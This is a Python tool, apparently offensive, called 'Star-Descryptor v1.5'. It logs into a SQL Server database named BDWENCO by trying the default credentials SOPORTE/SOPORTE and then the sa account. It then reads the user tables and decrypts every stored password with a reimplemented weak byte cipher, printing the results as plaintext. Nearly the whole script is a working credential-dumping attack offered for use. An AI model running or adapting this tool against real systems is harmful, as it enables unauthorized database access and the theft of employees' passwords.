# -*- coding: utf-8 -*-
import sys
import getpass

BANNER = r"""
  *        *      *****   *****      *****    *****    *****   *****   *   *   *****   *****   *****
  *       * *       *     *    *       *      *          *    *     *  *   *     *     *   *   *    
  *      *   *      *     *****        *      *****      *    *        *****     *     *****   *****
  *     *******     *     *    *       *      *          *    *     *  *   *     *     *       *    
  *****  *     *  *****   *     *    *****    *****    *****   *****   *   *   *****   *       *****
"""

def print_banner():
    print("=" * 100)
    print(BANNER)
    print("  >> Star-Descryptor v1.5  |  by mr.r360  |  remoto360.com <<")
    print("=" * 100)
    print()

# ─────────────────────────────────────────────
#  ALGORITMO DE DESCIFRADO
# ─────────────────────────────────────────────
def descifrar(texto_cifrado):
    bytes_cifrados = texto_cifrado.encode('latin-1')
    resultado = []
    for i, byte_val in enumerate(bytes_cifrados):
        pos = i % 8
        bloque_inicio = (i // 8) * 8
        c1_val = bytes_cifrados[bloque_inicio + 1] if len(bytes_cifrados) > bloque_inicio + 1 else 0
        llave_dinamica = 5 - (c1_val % 10)
        if pos == 0:
            origen = byte_val + 5
        elif pos == 1 or pos == 3:
            origen = byte_val + 36
        elif pos == 2 or pos == 4:
            origen = byte_val + llave_dinamica
        elif pos == 5:
            origen = byte_val + 32
        elif pos == 6:
            origen = byte_val // 2
        elif pos == 7:
            origen = byte_val + 37
        resultado.append(chr(origen % 256))
    return "".join(resultado)


# ─────────────────────────────────────────────
#  CONEXIÓN A SQL SERVER
# ─────────────────────────────────────────────
def conectar(ip, sql_user, sql_pass, instancia=None):
    try:
        import pyodbc
    except ImportError:
        print("\n[!] ERROR: pyodbc no está instalado.")
        print("    Ejecuta : apt-get install -y python3-pyodbc")
        print("    En Kali : pip3 install pyodbc --break-system-packages\n")
        sys.exit(1)

    servidor = f"{ip}\\{instancia}" if instancia else ip
    drivers = [
        "ODBC Driver 18 for SQL Server",
        "ODBC Driver 17 for SQL Server",
        "ODBC Driver 13 for SQL Server",
    ]
    conn_str_base = (
        f"SERVER={servidor};DATABASE=BDWENCO;"
        f"UID={sql_user};PWD={sql_pass};"
        "TrustServerCertificate=yes;Connection Timeout=8;"
    )
    for driver in drivers:
        try:
            conn = pyodbc.connect(f"DRIVER={{{driver}}};" + conn_str_base)
            print(f"[+] Conectado | driver: {driver} | usuario: {sql_user}")
            return conn
        except pyodbc.Error:
            continue
    return None


# ─────────────────────────────────────────────
#  DETECTAR TABLA Y LEER USUARIOS
# ─────────────────────────────────────────────
def tabla_existe(conn, nombre_tabla):
    cursor = conn.cursor()
    cursor.execute("""
        SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES
        WHERE TABLE_CATALOG = 'BDWENCO'
          AND TABLE_SCHEMA  = 'dbo'
          AND TABLE_NAME    = ?
    """, nombre_tabla)
    return cursor.fetchone()[0] > 0

def contar_registros(conn, nombre_tabla):
    cursor = conn.cursor()
    cursor.execute(f"SELECT COUNT(*) FROM BDWENCO.dbo.{nombre_tabla}")
    return cursor.fetchone()[0]

def leer_tabla_usuario(conn):
    """Tabla nueva: USUARIO (sin S)"""
    cursor = conn.cursor()
    cursor.execute("""
        SELECT USU_CODIGO, EMP_CODIGO, USU_NOMBRE, USU_PASSWORD
        FROM BDWENCO.dbo.USUARIO
        ORDER BY USU_CODIGO
    """)
    filas = cursor.fetchall()
    cols  = ["USU_CODIGO", "EMP_CODIGO", "USU_NOMBRE", "USU_PASSWORD"]
    return filas, cols

def leer_tabla_usuarios(conn):
    """Tabla antigua: USUARIOS (con S)"""
    cursor = conn.cursor()
    cursor.execute("""
        SELECT USU_CODIGO, USU_NOMBRE, USU_PASSWORD, USU_CARGO, USU_ESTADO, USU_TIPO
        FROM BDWENCO.dbo.USUARIOS
        ORDER BY USU_CODIGO
    """)
    filas = cursor.fetchall()
    cols  = ["USU_CODIGO", "USU_NOMBRE", "USU_PASSWORD", "USU_CARGO", "USU_ESTADO", "USU_TIPO"]
    return filas, cols

def detectar_y_leer(conn):
    tiene_usuario  = tabla_existe(conn, "USUARIO")
    tiene_usuarios = tabla_existe(conn, "USUARIOS")

    if tiene_usuario:
        count = contar_registros(conn, "USUARIO")
        if count > 0:
            print(f"[+] Tabla detectada: USUARIO ({count} registros)")
            return leer_tabla_usuario(conn), "USUARIO"

    if tiene_usuarios:
        count = contar_registros(conn, "USUARIOS")
        if count > 0:
            print(f"[+] Tabla detectada: USUARIOS ({count} registros)")
            return leer_tabla_usuarios(conn), "USUARIOS"

    # Fallback: intentar USUARIO aunque esté vacía
    if tiene_usuario:
        print("[~] Tabla USUARIO existe pero está vacía.")
        return leer_tabla_usuario(conn), "USUARIO"

    if tiene_usuarios:
        print("[~] Tabla USUARIOS existe pero está vacía.")
        return leer_tabla_usuarios(conn), "USUARIOS"

    print("[!] No se encontró tabla USUARIO ni USUARIOS en BDWENCO.")
    sys.exit(1)


def mostrar_resultados(filas, cols, tabla):
    if not filas:
        print(f"[!] La tabla {tabla} no tiene registros.")
        return

    # Índice de la columna de password
    pwd_idx = cols.index("USU_PASSWORD")

    # Anchos de columna
    col_w = []
    for c in cols:
        if c == "USU_NOMBRE" or c == "USU_CARGO":
            col_w.append(28)
        elif c == "USU_PASSWORD":
            col_w.append(22)
        else:
            col_w.append(12)

    headers_display = cols + ["PWD DESCIFRADO"]
    col_w_full = col_w + [22]

    sep = "─" * (sum(col_w_full) + len(col_w_full) * 3 + 1)
    print(sep)
    print(" " + " | ".join(h.ljust(col_w_full[i]) for i, h in enumerate(headers_display)))
    print(sep)

    for row in filas:
        valores = [str(v or "").strip() for v in row]
        pwd_enc = valores[pwd_idx]

        try:
            pwd_dec = descifrar(pwd_enc) if pwd_enc else "(vacío)"
        except Exception as e:
            pwd_dec = f"[ERR: {e}]"

        fila_display = valores + [pwd_dec]
        linea = " | ".join(str(v).ljust(col_w_full[i])[:col_w_full[i]] for i, v in enumerate(fila_display))
        print(f" {linea}")

    print(sep)
    print(f"\n[+] Total usuarios procesados: {len(filas)}")
    print(f"[+] Star-Descryptor v1.5 — remoto360.com\n")


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
print_banner()

ip = input("  IP del servidor SQL Server  : ").strip()
if not ip:
    print("[!] IP requerida.")
    sys.exit(1)

conn    = None
sa_pass = None

# ── Intento 1: SOPORTE / SOPORTE ──
print(f"\n[~] Probando SOPORTE / SOPORTE ...")
conn = conectar(ip, "SOPORTE", "SOPORTE")

# ── Intento 2: sa + contraseña pedida ──
if not conn:
    print("[!] Falló con SOPORTE.")
    sa_pass = getpass.getpass("\n  Contraseña del usuario sa   : ")
    print(f"[~] Probando sa ...")
    conn = conectar(ip, "sa", sa_pass)

# ── Intento 3: pedir instancia ──
if not conn:
    print(f"[!] No se pudo conectar a {ip} con instancia por defecto.")
    instancia = input("  Nombre de instancia (ej: SQLEXPRESS) : ").strip()
    if instancia:
        print(f"[~] Reintentando SOPORTE con instancia {instancia}...")
        conn = conectar(ip, "SOPORTE", "SOPORTE", instancia)
        if not conn and sa_pass:
            print(f"[~] Reintentando sa con instancia {instancia}...")
            conn = conectar(ip, "sa", sa_pass, instancia)

if not conn:
    print("[!] Conexión fallida. Verifica IP, instancia, firewall o puerto 1433.")
    sys.exit(1)

try:
    print("[~] Detectando tabla de usuarios...\n")
    (filas, cols), tabla = detectar_y_leer(conn)
    print()
    mostrar_resultados(filas, cols, tabla)
except Exception as e:
    print(f"[!] Error: {e}")
finally:
    conn.close()
